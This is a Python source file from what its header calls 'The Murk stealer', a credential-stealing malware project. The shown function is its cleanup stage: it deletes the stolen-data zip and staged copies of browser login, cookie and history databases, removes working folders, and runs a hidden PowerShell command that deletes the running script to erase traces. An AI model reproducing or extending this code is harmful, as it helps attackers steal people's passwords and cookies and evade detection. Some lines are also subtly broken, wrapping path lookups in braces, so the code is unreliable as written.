#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from os import remove,environ,path
import sys
import win32com.client

def End(np, bye):
    try:
        remove(f'{np[0]}.zip')
    except:
        pass
    try:
        remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
        remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
        remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
    except:
        pass
    try:
        remove({environ['USERPROFILE']}+'\\AppData\\Local\\IconCache.db')
    except:
        pass 
    try:
        remove({environ['USERPROFILE']}+'\\AppData\\Local\\windll')
    except:
        pass
    try:
        remove({environ['USERPROFILE']}+'\\AppData\\Local\\windll\\File-Grubber')
    except:
        pass
    if bye:
        script_path = path.abspath(sys.argv[0])
        ps_shell = win32com.client.Dispatch("WScript.Shell")
        command = f"powershell.exe -Command \"Start-Sleep -Seconds 3; Remove-Item -Path '{script_path}' -Force\""
        ps_shell.Run(command, 0, False)
        sys.exit()
    sys.exit()
